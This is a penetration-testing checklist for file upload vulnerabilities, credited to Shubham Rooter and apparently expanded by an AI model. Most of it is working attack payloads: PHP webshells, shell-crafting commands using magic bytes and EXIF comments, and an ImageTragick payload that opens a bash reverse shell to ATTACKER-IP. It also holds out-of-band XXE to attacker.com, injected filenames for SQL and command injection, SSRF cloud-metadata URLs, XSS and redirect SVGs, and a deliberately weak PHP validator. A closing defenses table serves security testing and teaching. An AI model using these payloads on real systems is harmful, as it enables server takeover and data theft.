# File Upload Vulnerabilities Checklist

> **First author:** Shubham Rooter  
> **Enhanced & Corrected version** — by Claude Sonnet 4.6. additions and fixes are marked with `[ADDED]` or `[FIXED]`.

---

## Table of Contents

1. [Extension → Impact Map](#1-extension--impact-map)
2. [Bypass Techniques](#2-bypass-techniques)
   - [Blacklist Bypass](#21-blacklist-bypass)
   - [Whitelist Bypass](#22-whitelist-bypass)
   - [Content-Type Bypass](#23-content-type-bypass)
   - [Magic Bytes Bypass](#24-magic-bytes-bypass)
   - [Comment-in-Image Bypass](#25-comment-in-image-bypass)
3. [Vulnerability Classes](#3-vulnerability-classes)
   - [Directory Traversal](#31-directory-traversal)
   - [SQL Injection via Filename](#32-sql-injection-via-filename)
   - [Command Injection via Filename](#33-command-injection-via-filename)
   - [SSRF](#34-ssrf)
   - [ImageTragick (ImageMagick RCE)](#35-imagetragick-imagemagick-rce)
   - [XXE via SVG / Excel](#36-xxe-via-svg--excel)
   - [XSS](#37-xss)
   - [Open Redirect](#38-open-redirect)
4. [Upload Tricks & Special Characters](#4-upload-tricks--special-characters)
5. [Miscellaneous Attacks](#5-miscellaneous-attacks)
6. [.htaccess Upload Bypass](#6-htaccess-upload-bypass) `[ADDED]`
7. [Race Condition Upload](#7-race-condition-upload) `[ADDED]`
8. [Polyglot Files](#8-polyglot-files) `[ADDED]`
9. [Full Testing Scenario / Methodology](#9-full-testing-scenario--methodology)
10. [Vulnerable Code Example — Magic Bytes Check](#10-vulnerable-code-example--magic-bytes-check)
11. [Defenses & Mitigations](#11-defenses--mitigations) `[ADDED]`
12. [References](#12-references)

---

## 1. Extension → Impact Map

| Extension(s) | Potential Impact |
|---|---|
| `.asp`, `.aspx`, `.php`, `.php3`, `.php5` | Webshell, Remote Code Execution (RCE) |
| `.svg` | Stored XSS, SSRF, XXE |
| `.gif` | Stored XSS, SSRF |
| `.csv` | CSV / Formula Injection |
| `.xml` | XXE |
| `.avi` | LFI, SSRF |
| `.html`, `.js` | HTML Injection, XSS, Open Redirect |
| `.png`, `.jpeg` | Pixel Flood Attack (DoS) |
| `.zip` | RCE via LFI, DoS, Zip Slip |
| `.pdf`, `.pptx` | SSRF, Blind XXE |
| `.config`, `web.config` | `[ADDED]` RCE on IIS servers (overwrite web.config to execute ASP) |
| `.htaccess` | `[ADDED]` RCE on Apache (redefine MIME handler for arbitrary extensions) |

---

## 2. Bypass Techniques

### 2.1 Blacklist Bypass

If the server blacklists specific extensions, try these alternate extensions that may still execute:

**PHP variants:**
```
.phtm  .phtml  .phps  .pht  .php2  .php3  .php4  .php5
.shtml  .phar  .pgif  .inc
```

**ASP variants:**
```
.asp  .aspx  .cer  .asa
```

**JSP variants:**
```
.jsp  .jspx  .jsw  .jsv  .jspf
```

**ColdFusion variants:**
```
.cfm  .cfml  .cfc  .dbm
```

**Case randomization:**
```
.pHp  .pHP5  .PhAr
```

---

### 2.2 Whitelist Bypass

If the server only allows specific extensions (e.g., `.jpg`), attempt:

```
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg          # Null byte — truncates at %00, server may see .jpg but execute .php
file.php\x00.jpg         # Hex null byte — rename file.phpD.jpg and change 44→00 in a hex editor
file.php%00
file.php%20              # Trailing space — stripped on Windows
file.php%0d%0a.jpg       # CRLF injection
file.php.....            # Trailing dots — stripped on Windows
file.php/
file.php.\
file.php#.png            # Fragment identifier trick
file.                    # Trailing dot
.html
```

**`[ADDED]` Right-to-Left Override (RTLO):**
```
name.%E2%80%AEphp.jpg    # Renders visually as name.gpj.php — extension hidden from user view
```

---

### 2.3 Content-Type Bypass

Change the `Content-Type` header in the HTTP request to a trusted MIME type while keeping the malicious payload:

```
# Original (blocked):
Content-Type: application/x-php

# Replace with any of:
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/jpeg
Content-Type: image/jpg
Content-Type: image/webp    # [ADDED]
```

**Small PHP shell that may evade length-based checks:**
```php
<?=`$_GET[x]`?>
```

**Content-with-GIF-header bypass** (tricks content scanners checking for image headers):
```
GIF89a; <?php system($_GET['cmd']); ?>
```

**`[ADDED]` Setting Content-Type twice in the request:**  
Some parsers read only the first header; send the allowed type first, the malicious type second (or vice versa depending on parser behavior).

---

### 2.4 Magic Bytes Bypass

Magic bytes (file signatures) are the first bytes of a file used to identify its type — independently of the extension.

**Common magic bytes:**

| Format | Magic Bytes (hex) | ASCII |
|---|---|---|
| JPEG | `FF D8 FF` | `ÿØÿ` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| GIF87a | `47 49 46 38 37 61` | `GIF87a` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |
| `[ADDED]` BMP | `42 4D` | `BM` |
| `[ADDED]` PSD | `38 42 50 53` | `8BPS` |

**Full reference:** https://en.wikipedia.org/wiki/List_of_file_signatures

**Tools:**
```bash
# Inspect magic bytes
xxd image.jpeg | head

# Install hex editor
sudo apt-get install hexedit

# Open file in hex editor
hexeditor image.png
# Move cursor to byte → type new value → Ctrl+X → Y to save
```

**Craft a PHP shell with JPEG magic bytes:**
```bash
echo -n -e '\xFF\xD8\xFF\xE0\n<?php system($_GET["cmd"]); ?>' > shell.jpg.pHp
# or
echo -e $'\xFF\xD8\xFF\xE0\n<?php system($_GET["cmd"]); ?>' > shell.jpg.pHp

# Verify it looks like a JPEG to the OS:
file shell.jpg.pHp
# Output: shell.jpg.pHp: JPEG image data
```

**How to determine what the uploader validates:**
1. Rename shell to `.jpg` → still blocked? → not checking extension only.
2. Change Content-Type to `image/jpeg` → still blocked? → not checking Content-Type only.
3. If both pass but original `.php` fails → **it's checking magic bytes** → use the technique above.

---

### 2.5 Comment-in-Image Bypass

For uploads validated with PHP `getimagesize()`, shellcode can be hidden in EXIF metadata:

```bash
# Inject PHP into the EXIF Comment field
exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); ?>' file.jpg

# Rename to a PHP-executing extension
mv file.jpg file.php.jpg
```

The image passes `getimagesize()` checks because the JPEG structure is valid; the PHP is embedded in metadata that gets executed when the file is parsed by the PHP engine.

---

## 3. Vulnerability Classes

### 3.1 Directory Traversal

Manipulate the filename to write files outside the intended upload directory:

```
../../etc/passwd/logo.png
../../../logo.png          # May overwrite assets like a site logo
../../index.php            # [ADDED] Overwrite application files directly
```

**`[ADDED]` Windows-specific:**
```
..\..\..\windows\win.ini
```

---

### 3.2 SQL Injection via Filename

If the filename is stored in a database without sanitization:

```sql
'sleep(10).jpg          # Blind SQLi — time-based
sleep(10)-- -.jpg
' OR '1'='1.jpg         # [ADDED] Boolean-based
```

---

### 3.3 Command Injection via Filename

If the filename is passed to a shell command (e.g., `system("convert " . $filename)`):

```bash
; sleep 10;
| whoami
`id`.jpg
$(id).jpg               # [ADDED]
& ping -c 10 127.0.0.1  # [ADDED] Windows/Linux
```

---

### 3.4 SSRF

**Via "Upload from URL" feature:**
- Supply an internal URL such as `http://169.254.169.254/latest/meta-data/` (AWS metadata) instead of an external image.
- Use an IP logger URL to harvest visitor metadata.

**Via `.svg` file upload:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="200" height="200">
  <image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" />
</svg>
```

**`[ADDED]` Cloud metadata targets:**
```
http://169.254.169.254/latest/meta-data/          # AWS
http://metadata.google.internal/computeMetadata/  # GCP
http://169.254.169.254/metadata/instance          # Azure
```

---

### 3.5 ImageTragick (ImageMagick RCE)

Targets applications that process images with ImageMagick (CVE-2016-3714 and variants).

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1|touch "hello)'
pop graphic-context
```

**`[ADDED]` Policy bypass variant (newer ImageMagick versions):**
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

---

### 3.6 XXE via SVG / Excel

**SVG — read local file:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     version="1.1">
  <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

**SVG — execute command via `expect://` wrapper:**
```xml
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="300" version="1.1" height="200">
  <image xlink:href="expect://ls"></image>
</svg>
```

**`[ADDED]` SVG — out-of-band (OOB) exfiltration:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>
```

**Via Excel/Office files:**  
Embed XXE payloads inside `xl/workbook.xml` or `word/document.xml` within a `.xlsx` / `.docx` (ZIP archive).

> 📚 Lab: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

---

### 3.7 XSS

**Malicious filename (stored XSS if filename is reflected in the UI):**
```
filename="<svg onload=alert(document.domain)>"
filename="58832_300x300.jpg<svg onload=confirm()>"
```

**GIF with embedded XSS:**
```
GIF89a *<svg/onload=alert(1)>*/=alert(document.domain)//;
```

**SVG — inline event handler:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**SVG — script tag:**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100"
        style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">
    alert("XSS");
  </script>
</svg>
```

> 📚 Reference: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-uploading-files-svg  
> 📚 Reference: https://brutelogic.com.br/blog/file-upload-xss/

---

### 3.8 Open Redirect

**Via `.svg` file:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
  onload="window.location='https://attacker.com'"
  xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100"
        style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
```

---

## 4. Upload Tricks & Special Characters

| Technique | Example |
|---|---|
| Double extension | `file.jpg.php`, `file.png.php5` |
| Reverse double extension | `file.php.jpg` (Apache executes left-most `.php`) |
| Random case | `.pHp`, `.pHP5`, `.PhAr` |
| Null byte (URL-encoded) | `file.php%00.gif`, `file.php%00.png`, `file.php%00.jpg` |
| Null byte (hex) | `file.php\x00.gif`, `file.php\x00.png`, `file.php\x00.jpg` |
| Trailing space | `file.php%20` |
| CRLF | `file.php%0d%0a.jpg`, `file.php%0a` |
| Trailing dots (Windows strips them) | `file.php......` |
| Slash variants | `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp` |
| Multiple special chars | `file.jsp/././././.` |
| RTLO (Right-to-Left Override) | `name.%E2%80%AEphp.jpg` → displays as `name.gpj.php` |
| NTFS ADS (Windows) | `file.asax:.jpg` → creates empty `.asax`, edit separately |
| NTFS `$data` stream | `file.asp::$data.` |

**MIME type spoofing:**

```
Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg
```

> Wordlist: `SecLists/Discovery/Web-Content/content-type.txt`

**Magic bytes prepend:**

```
PNG:  \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG:  \xff\xd8\xff
GIF:  GIF87a  OR  GIF89a
```

---

## 5. Miscellaneous Attacks

### Pixel Flood (DoS)
Upload a specially crafted PNG/JPEG with an absurd canvas size declared in its header (e.g., 100,000×100,000 px). When the server tries to decompress/render the image, it exhausts memory.

### DoS via Long Filename
```
12345678901234567890...99.png    # Filename exceeds buffer limits
```

### Zip Slip
1. Create a ZIP archive containing a path-traversal filename: `../../var/www/html/shell.php`
2. Upload the `.zip` file.
3. If the server extracts it without sanitizing paths, the shell lands in the web root.
4. Access: `https://site.com/path?page=zip://path/file.zip%23rce.php`

### Uploading `web.config` / `.js` Config Files
On IIS servers, a malicious `web.config` can instruct the server to treat any extension (e.g., `.jpg`) as an executable ASPX handler, enabling RCE.

---

## 6. `.htaccess` Upload Bypass `[ADDED]`

On Apache servers, uploading a `.htaccess` file can redefine how extensions are handled:

```apache
# Makes the server execute .jpg files as PHP
AddType application/x-httpd-php .jpg
```

**Attack flow:**
1. Upload `.htaccess` with the above content (if the upload directory is served by Apache and `.htaccess` is allowed).
2. Upload `shell.jpg` containing PHP code.
3. Access `shell.jpg` — Apache executes it as PHP.

**Why it works:** `AllowOverride All` (common in dev environments) lets per-directory `.htaccess` files override server configuration.

---

## 7. Race Condition Upload `[ADDED]`

Some upload endpoints:
1. Accept the file temporarily.
2. Run validation (AV scan, extension check, etc.).
3. Delete or move the file based on results.

**Attack:** Send the upload request and immediately (in parallel) send GET requests to the temporary file path before the server deletes it.

```bash
# Example with Turbo Intruder or a script:
# Thread 1 — upload shell.php repeatedly
# Thread 2 — request /uploads/shell.php repeatedly
# If timing aligns, the shell executes before deletion
```

**Tools:** Burp Suite Turbo Intruder, `ffuf`, custom Python threading scripts.

---

## 8. Polyglot Files `[ADDED]`

A polyglot is a single file that is simultaneously valid in two different formats. This defeats content-aware validators that check both magic bytes and file structure.

**JPEG + PHP polyglot:**
```bash
# The file is a valid JPEG AND contains executable PHP
echo -n -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00' > poly.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> poly.php.jpg
```

**PDF + JavaScript polyglot:**  
A PDF can contain embedded JavaScript that executes in the browser when rendered inline, enabling XSS even through strict image validators.

**ZIP + JPEG polyglot:**  
A file can have a JPEG header but be a valid ZIP archive simultaneously (append ZIP to end of JPEG — ZIP is parsed from the end). Useful for Zip Slip through image validators.

---

## 9. Full Testing Scenario / Methodology

Use this sequence when testing an upload endpoint:

1. **Baseline** — Upload a legitimate file (e.g., `image.jpg`). Confirm it works and note where/how it's served.
2. **Plain PHP** — Upload `shell.php` directly. Note the rejection method.
3. **Double extension** — Try `shell.jpg.php` and `shell.php.jpg`.
4. **Content-Type spoof** — Keep `shell.php`, change `Content-Type` to `image/jpeg`.
5. **Case variation** — Try `shell.PhP`, `shell.php5`, `shell.pHP5`.
6. **Null byte** — Try `shell.php%00.jpg`, `shell.php%0a`, `shell.php%00`.
7. **EXIF/comment injection** — Embed PHP in EXIF Comment of a real image; rename to `shell.php.jpg`.
8. **Magic bytes** — Prepend JPEG magic bytes (`FF D8 FF E0`) to a PHP shell; upload as `shell.jpg.pHp`.
9. **`.htaccess`** — Upload `.htaccess` redefining `.jpg` as PHP; then upload `shell.jpg`.
10. **Race condition** — Upload + immediately fetch in parallel.
11. **SVG/XXE** — Upload an SVG with XXE payload; check server response for file content.
12. **Archive** — Upload a ZIP with a path-traversal entry (Zip Slip).
13. **Pixel flood** — Upload a decompression-bomb image; watch for server slowness.
14. **Filename injection** — Test SQL injection, command injection, and XSS via the filename field.

---

## 10. Vulnerable Code Example — Magic Bytes Check

The following PHP code **only** checks magic bytes and can be bypassed by prepending the expected bytes to any payload:

```php
<?php
$allowed_image_types = false;
$image_content = file_get_contents('image.png');   // [FIXED] was: $image_content missing $

$allowed_image_types = array(
    'jpeg' => "\xFF\xD8\xFF",
    'gif'  => "GIF",
    'png'  => "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a",
    'bmp'  => "BM",
    'psd'  => "8BPS",
    'swf'  => "FWS",
);

foreach ($allowed_image_types as $allowed_image_type => $allowed_binary_check) {
    // [FIXED] Original code used bare `image_content` — missing $ sigil, causes PHP notice/error
    if (substr($image_content, 0, strlen($allowed_binary_check)) === $allowed_binary_check) {
        echo 'This ' . $allowed_image_type . ' image is allowed!';
    } else {
        echo 'Nope!';
    }
}
?>
```

**Why this is insufficient:**
- It only checks the first N bytes. An attacker can prepend valid magic bytes to a PHP shell and pass validation.
- It does not check the file extension or re-validate the full file structure.
- A polyglot file (e.g., valid JPEG header + PHP body) defeats this entirely.

---

## 11. Defenses & Mitigations `[ADDED]`

| Control | Description |
|---|---|
| **Allowlist extensions** | Only permit specific, known-safe extensions. Never blacklist. |
| **Validate MIME type server-side** | Don't trust `Content-Type` header — detect MIME from file content using a library (e.g., `finfo_file()` in PHP, `python-magic`). |
| **Validate file structure** | For images, use `getimagesize()` + re-encode with GD/Pillow to strip non-image data. |
| **Store outside web root** | Upload directory should not be directly accessible via HTTP. Serve files through a script. |
| **Randomize filenames** | Replace user-supplied filenames with a random UUID. Prevents filename-based injection. |
| **Disable script execution in upload directory** | Apache: `Options -ExecCGI`, deny `.php` handler. Nginx: skip PHP-FPM for upload paths. Block `.htaccess` overrides with `AllowOverride None`. |
| **Scan with antivirus / content inspection** | Run uploaded files through ClamAV or cloud-based malware scanning. |
| **Enforce file size limits** | Prevent DoS via large file uploads and pixel flood attacks. |
| **Use a separate domain / CDN for uploads** | Serve user-uploaded content from a sandboxed origin so XSS cannot access the main app's cookies. |
| **Set correct Content-Disposition** | Serve files with `Content-Disposition: attachment` to prevent inline browser execution. |
| **Set `Content-Security-Policy`** | Limit script sources to prevent XSS from SVG or HTML uploads. |
| **Sanitize filenames before DB storage** | Prevent SQL injection and command injection from filename values. |

---

## 12. References

- https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md
- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://github.com/swisskyrepo/PayloadsAllTheThings/
- https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
- https://brutelogic.com.br/blog/file-upload-xss/
- https://en.wikipedia.org/wiki/List_of_file_signatures
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload `[ADDED]`
- https://portswigger.net/web-security/file-upload `[ADDED]`

---

*Author: [Shubham Rooter](https://github.com/shubham-rooter) | Enhanced version with corrections and additions.*
